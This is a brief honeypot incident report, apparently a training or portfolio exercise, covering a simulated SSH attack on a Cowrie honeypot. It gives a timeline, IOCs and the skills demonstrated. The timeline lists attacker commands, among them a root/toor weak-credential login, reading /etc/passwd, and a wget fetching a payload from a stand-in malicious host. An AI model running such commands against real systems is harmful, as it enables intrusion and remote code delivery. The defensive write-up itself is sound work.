## Summary

A synthetic SSH-based attack was simulated against a Cowrie honeypot to demonstrate incident investigation workflow. The attacker connected via SSH, authenticated successfully using weak credentials (root/toor), performed basic reconnaissance (whoami, uname -a, cat /etc/passwd), attempted to download a remote payload via wget, ran a final directory listing, then disconnected.

## Timeline

- 12:11:04 SSH connection established from 127.0.0.1
- 12:11:48 Login succeeded as root/toor
- 12:12:56 Command executed: whoami
- 12:13:11 Command executed: uname -a
- 12:13:26 Command executed: cat /etc/passwd
- 12:14:37 Command executed: wget http://malicious-site.com/payload.sh
- 12:14:38 File download event logged (cowrie.session.file_download)
- 12:14:50 Command executed: ls -la
- 12:14:53 Session closed / attacker disconnected

## Indicators of Compromise (IOCs)

- Source IP: 127.0.0.1
- Malicious URL: http://malicious-site.com/payload.sh
- Payload SHA-256: 183e4b9b791f0bfbe18196f47c9081d0fe223f525b5970bfaa73479ad1d441eb

## Skills Demonstrated

- Log analysis and timeline reconstruction from honeypot session data
- Identification and documentation of Indicators Of Compromise (IOCs)
- Incident investigation workflow (detection -> analysis -> documentation)
- Technical writing for security incident reporting
